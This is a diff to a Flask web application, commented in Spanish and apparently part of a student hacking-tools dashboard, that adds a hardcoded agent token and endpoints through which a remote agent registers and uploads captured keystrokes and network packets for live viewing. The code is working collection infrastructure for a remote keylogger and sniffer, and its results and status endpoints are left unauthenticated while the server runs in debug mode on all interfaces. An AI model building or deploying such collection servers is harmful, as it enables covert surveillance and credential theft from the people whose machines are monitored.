@@ -11,6 +11,11 @@ from keylogger import keylogger
 
 app = Flask(__name__)
 
+# ── Token de seguridad compartido con remote_agent.py ────────────────────────
+# Cambia este valor si quieres más seguridad.
+# Debe coincidir con el --token que se le pasa a remote_agent.py.
+AGENT_TOKEN = 'CIBER2026'
+
 
 @app.route('/')
 def index():
@@ -200,5 +205,120 @@ if __name__ == '__main__':
     print("  📡 Scanner | 🔑 Passwords | 🕵️ Sniffer | ⌨️ Keylogger")
     print("=" * 60)
     print("  Servidor corriendo en: http://127.0.0.1:5000")
+    print(f"  Token del agente remoto: CIBER2026")
     print("=" * 60 + "\n")
     app.run(debug=True, host='0.0.0.0', port=5000)
+
+
+# ────────────────────────────────────────────────────────────
+# ENDPOINTS DEL AGENTE REMOTO (remote_agent.py)
+# ────────────────────────────────────────────────────────────
+
+def _check_token(data: dict) -> bool:
+    """Valida el token del agente."""
+    return data.get('agent_token') == AGENT_TOKEN
+
+
+@app.route('/agent/register', methods=['POST'])
+def agent_register():
+    """
+    El agente remoto se registra aquí antes de empezar a enviar datos.
+    Limpia cualquier captura previa del modo correspondiente.
+    """
+    data = request.get_json()
+    if not data or not _check_token(data):
+        return jsonify({'success': False, 'error': 'Token inválido o no autorizado.'}), 403
+
+    mode = data.get('mode')
+    agent_info = {
+        'agent_ip': data.get('agent_ip', 'desconocida'),
+        'mode': mode,
+        'registered_at': __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'count': data.get('count'),
+        'duration': data.get('duration'),
+        'filter': data.get('filter', 'all'),
+    }
+
+    if mode == 'sniffer':
+        result = sniffer.register_remote_agent(agent_info)
+    elif mode == 'keylogger':
+        result = keylogger.register_remote_agent(agent_info)
+    else:
+        return jsonify({'success': False, 'error': 'Modo no válido. Usa: sniffer o keylogger.'}), 400
+
+    print(f"[AGENTE] Registrado: IP={agent_info['agent_ip']} modo={mode}")
+    return jsonify(result)
+
+
+@app.route('/agent/push-packets', methods=['POST'])
+def agent_push_packets():
+    """
+    El agente remoto (modo sniffer) envía paquetes capturados en lotes.
+    """
+    data = request.get_json()
+    if not data or not _check_token(data):
+        return jsonify({'success': False, 'error': 'Token inválido.'}), 403
+
+    packets = data.get('packets', [])
+    final = data.get('final', False)
+
+    if not isinstance(packets, list):
+        return jsonify({'success': False, 'error': 'Formato de paquetes inválido.'}), 400
+
+    result = sniffer.receive_remote_packets(packets, final=final)
+    return jsonify(result)
+
+
+@app.route('/agent/push-keys', methods=['POST'])
+def agent_push_keys():
+    """
+    El agente remoto (modo keylogger) envía teclas capturadas en lotes.
+    """
+    data = request.get_json()
+    if not data or not _check_token(data):
+        return jsonify({'success': False, 'error': 'Token inválido.'}), 403
+
+    keys = data.get('keys', [])
+    final = data.get('final', False)
+
+    if not isinstance(keys, list):
+        return jsonify({'success': False, 'error': 'Formato de teclas inválido.'}), 400
+
+    result = keylogger.receive_remote_keys(keys, final=final)
+    return jsonify(result)
+
+
+@app.route('/agent/results/sniffer', methods=['GET'])
+def agent_results_sniffer():
+    """
+    El frontend hace polling a este endpoint para obtener los paquetes
+    remotos acumulados en tiempo real.
+    """
+    result = sniffer.get_remote_results()
+    return jsonify(result)
+
+
+@app.route('/agent/results/keylogger', methods=['GET'])
+def agent_results_keylogger():
+    """
+    El frontend hace polling a este endpoint para obtener las teclas
+    remotas acumuladas en tiempo real.
+    """
+    result = keylogger.get_remote_results()
+    return jsonify(result)
+
+
+@app.route('/agent/status', methods=['GET'])
+def agent_status():
+    """Estado rápido de los agentes conectados (para depuración)."""
+    sniffer_info = sniffer._remote_agent_info
+    keylogger_info = keylogger._remote_agent_info
+    return jsonify({
+        'success': True,
+        'sniffer_agent': sniffer_info or None,
+        'sniffer_packets': len(sniffer._remote_packets),
+        'sniffer_complete': sniffer._remote_complete,
+        'keylogger_agent': keylogger_info or None,
+        'keylogger_keys': len(keylogger._remote_keys),
+        'keylogger_complete': keylogger._remote_complete,
+    })
